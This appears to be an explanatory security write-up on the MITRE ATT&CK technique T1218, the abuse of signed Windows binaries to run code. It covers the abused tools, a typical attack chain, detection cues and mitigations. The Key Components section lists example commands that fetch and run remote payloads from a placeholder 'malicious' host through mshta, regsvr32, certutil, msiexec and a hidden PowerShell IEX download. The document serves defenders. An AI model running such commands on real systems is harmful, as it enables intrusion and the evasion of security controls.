@@ -1,0 +1,54 @@
+**Definition**
+
+T1218 System Binary Proxy Execution is a defense evasion technique identified in the MITRE ATT&CK framework. It describes the abuse of legitimate, signed, and often trusted system binaries to execute arbitrary code, bypass application control, and evade security monitoring. The core principle is that security tools and endpoint detection and response (EDR) systems frequently whitelist or trust binaries signed by Microsoft or other vendors. By proxying malicious payloads through these binaries, attackers can execute code without triggering alerts that would accompany the direct launch of an untrusted executable, script, or command.
+
+**Key Components**
+
+The technique relies on a small set of native Windows binaries that accept command-line arguments, scripts, or other input to load and execute code. The most commonly abused binaries include:
+
+- **Mshta.exe**: Executes Microsoft HTML Application (HTA) files. Attackers can use mshta to run JavaScript or VBScript embedded in an HTA file, often hosted remotely. Example: `mshta.exe javascript:..."` or `mshta.exe http://malicious/payload.hta`.
+- **Rundll32.exe**: Loads and executes exported functions from DLL files. Attackers can use rundll32 to call a function that launches a payload, or to execute JavaScript via `rundll32.exe javascript:"..."`. Example: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('test')`.
+- **Regsvr32.exe**: Registers DLLs as COM components. It can be used to execute scriptlet (.sct) files via the `scrobj.dll` COM object. Example: `regsvr32.exe /s /u /i:http://malicious/payload.sct scrobj.dll`.
+- **Certutil.exe**: Primarily used for certificate management, but can decode base64-encoded files, download files from URLs, and write them to disk. Example: `certutil.exe -urlcache -split -f http://malicious/payload.exe payload.exe`.
+- **Cscript.exe / Wscript.exe**: Windows Script Host engines. While not always signed by Microsoft, they are often whitelisted. Attackers use them to run .js, .vbs, or .jse files. Example: `cscript.exe //nologo malicious.js`.
+- **Msiexec.exe**: Windows Installer. Can execute arbitrary DLLs or scripts via custom action tables in an MSI file. Example: `msiexec.exe /q /i http://malicious/payload.msi`.
+- **Powershell.exe**: While not a "system binary" in the same sense, it is often whitelisted. Attackers use it to execute scripts, download payloads, and run in-memory code. Example: `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious/script.ps1')"`.
+
+The common thread across all these binaries is that they are legitimate, signed, and frequently used by administrators, making them difficult to block outright. Attackers leverage them to bypass application whitelisting (e.g., AppLocker, Windows Defender Application Control) and to evade signature-based detection by executing code in memory or through trusted processes.
+
+**Real-World Application**
+
+In a typical attack chain, T1218 is used after initial access (e.g., phishing) or during lateral movement. A common scenario:
+
+1. **Initial Access**: A user receives a phishing email with a link to an HTA file. When clicked, the browser downloads the HTA file and Windows prompts to open it with mshta.exe.
+2. **Execution**: The HTA file contains JavaScript that downloads a second-stage payload (e.g., Cobalt Strike beacon) from a remote server and executes it in memory using PowerShell or rundll32.
+3. **Defense Evasion**: The mshta.exe process is trusted by the EDR. The second-stage payload is never written to disk, avoiding file-based scanning. The attacker now has a beacon running under a legitimate system process.
+4. **Lateral Movement**: The attacker uses the same technique on other machines, perhaps using regsvr32.exe to execute a scriptlet that runs a PowerShell command to install a service or create a scheduled task.
+
+Another real-world example is the use of certutil.exe to download and decode a base64-encoded executable. This bypasses network proxies that might block .exe downloads but allow .txt or .cer files. The attacker hosts the encoded payload on a compromised web server, and certutil decodes it on the target.
+
+**Security Relevance**
+
+For security engineers, T1218 is a high-priority detection and prevention target. Its relevance stems from several factors:
+
+- **Prevalence**: T1218 is used by a wide range of threat actors, from commodity malware to advanced persistent threats (APTs). It appears in many attack chains as a standard evasion technique.
+- **Difficulty of Mitigation**: Blocking these binaries outright is often not feasible because they are required for legitimate administrative tasks. For example, disabling mshta.exe may break internal web applications that use HTA files.
+- **Detection Challenges**: The binaries themselves are not malicious. Detection must focus on anomalous behavior, such as:
+    - Mshta.exe spawning a child process (e.g., cmd.exe, powershell.exe).
+    - Rundll32.exe executing JavaScript or connecting to the internet.
+    - Regsvr32.exe with command-line arguments pointing to a remote URL.
+    - Certutil.exe downloading files from unusual domains or with unusual file extensions.
+    - Any of these binaries running from a user’s temporary folder or a non-standard location.
+- **Logging Requirements**: Effective detection requires enabling command-line logging (Event ID 4688 for process creation with command line), PowerShell script block logging (Event ID 4104), and network connection logging (Event ID 5156). Without these, the technique is nearly invisible.
+- **Mitigation Strategies**:
+    - **Application Control**: Use AppLocker or WDAC to restrict which binaries can execute and from which paths. For example, allow mshta.exe only from `C:\Windows\System32\` and block it from running from `%TEMP%` or `%APPDATA%`.
+    - **Command-Line Filtering**: Deploy rules that block specific command-line patterns, such as `regsvr32.exe` with `/i:` and a URL, or `rundll32.exe` with `javascript:`.
+    - **Network Segmentation**: Limit outbound internet access from workstations to reduce the ability to download remote payloads.
+    - **User Education**: Train users to recognize phishing attempts that lead to HTA or script downloads.
+    - **Hunting**: Proactively search for process creation events involving these binaries with suspicious command lines or parent-child relationships.
+
+**Key Takeaways**
+
+1. T1218 System Binary Proxy Execution abuses trusted Windows binaries (mshta, rundll32, regsvr32, certutil, etc.) to execute arbitrary code, bypassing application control and evading EDR detection by operating under legitimate process names.
+2. Detection requires enabling detailed logging (process creation with command line, PowerShell script block logging) and focusing on anomalous behavior such as these binaries spawning child processes, connecting to the internet, or running from non-standard paths.
+3. Mitigation is achieved through a combination of application whitelisting (AppLocker/WDAC), command-line filtering rules, network segmentation, and user education, rather than attempting to block the binaries themselves.
